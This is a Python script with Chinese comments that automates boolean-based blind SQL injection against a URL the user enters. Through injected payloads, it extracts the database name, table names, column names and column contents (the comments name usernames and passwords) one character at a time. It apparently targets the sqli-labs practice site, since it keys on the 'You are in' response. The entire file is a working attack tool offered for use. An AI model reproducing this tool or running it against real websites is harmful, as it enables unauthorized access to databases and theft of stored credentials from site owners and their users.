import requests
from bs4 import BeautifulSoup#网页解析，获取数据
import re   #正则表达式
import urllib.request,urllib.error  #制定URL,获取网页数据
import xlwt  #进行excel操作
import sqlite3 #进行SqLite数据库操作


def main():

    #使用说明在getHTML中的key【返回的html文件中的关键字】需要自己更改

    s=input("请你输入你想BoolSql的网站:")#网站连接

    #此段是用来判断数据库的长度
    temp=1#用来判断数据库的长度变量

    while True:
        baseurl = '%s\' and length((select database()))=%d--+'%(s,temp)
        if(getHTML(baseurl)):
            print("数据库的长度是%d"%(temp))
            break
        else:
            temp+=1


    #此段是用来and ascii(substr((select database()),1,1))=115--+
    print("数据库的名称:",end="")
    database=""
    for j in range(1,temp+1):
        for i in range(0,128):
            baseurl2='%s\' and ascii(substr((select database()),%d,1))=%d--+'%(s,j,i)
            if(getHTML(baseurl2)):
                print(chr(i),end="")
                database=database+chr(i)
    print()



    #此段是用来判断数据库所有表的长度and length((select group_concat(table_name) from information_schema.tables where table_schema=database()))>13--+
    temp3=1
    while True:
        baseurl3 = '%s\' and length((select group_concat(table_name) from information_schema.tables where table_schema=database()))=%d--+'%(s,temp3)
        if(getHTML(baseurl3)):
            print("所有表的长度为:%d"%(temp3))
            break
        else:
            temp3+=1



    #此段用来判断数据库的表名and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))>99--+
    print("数据库的表名为:",end="")
    for j in range(1,temp3+1):
        for i in range(0,128):
            baseurl4='%s\' and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1))=%d--+'%(s,j,i)
            if(getHTML(baseurl4)):
                print(chr(i),end="")

    print()
    tableName=input("请输入你要查询的表名:")

    #此段是用来判断字段长度的and length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'))>20--+
    temp4=1
    while True:
        baseurl5 = '%s\' and length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=\'%s\'))=%d--+'%(s,tableName,temp4)
        if(getHTML(baseurl5)):
            print("该表的字段的长度为:%d"%(temp4))
            break
        else:
            temp4+=1

    #此段是用来判断此段名的and ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),1,1))>99--+
    print("该表的字段的名为:", end="")
    for j in range(1, temp4 + 1):
        for i in range(0, 128):
            baseurl6 = '%s\' and ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=\'%s\'),%d,1))=%d--+'%(s,tableName,j,i)
            if (getHTML(baseurl6)):
                print(chr(i), end="")



    print()
    #此段是用来判断字段内容长度的and length((select group_concat(username,password) from users))>109--+
    b = []
    for i in range(0, 2):
        b.append(input("请输入你想查看的字段:"))
    temp5 = 1
    while True:
        baseurl7 = '%s\' and length((select group_concat(%s,%s) from users))=%d--+'%(s,b[0],b[1],temp5)
        if (getHTML(baseurl7)):
            print("该字段内容的长度为:%d" % (temp5))
            break
        else:
            temp5 += 1


    #此段使用来判断字段内容and ascii(substr((select group_concat(username,password) from users),1,1))>50--+
    print("该字段内容为:", end="")
    for j in range(1, temp5 + 1):
        for i in range(0, 128):
            baseurl8 = '%s\' and ascii(substr((select group_concat(%s,%s) from %s),%d,1))=%d--+'%(s,b[0],b[1],tableName,j,i)
            if (getHTML(baseurl8)):
                print(chr(i), end="")


#获取指定的url的网页信息
def getHTML(url):
    key='You are in...........'#返回的html文件中的关键字
    html=requests.get(url)
    if key in html.text:
        return True



if __name__ == '__main__':  #程序入口
    main()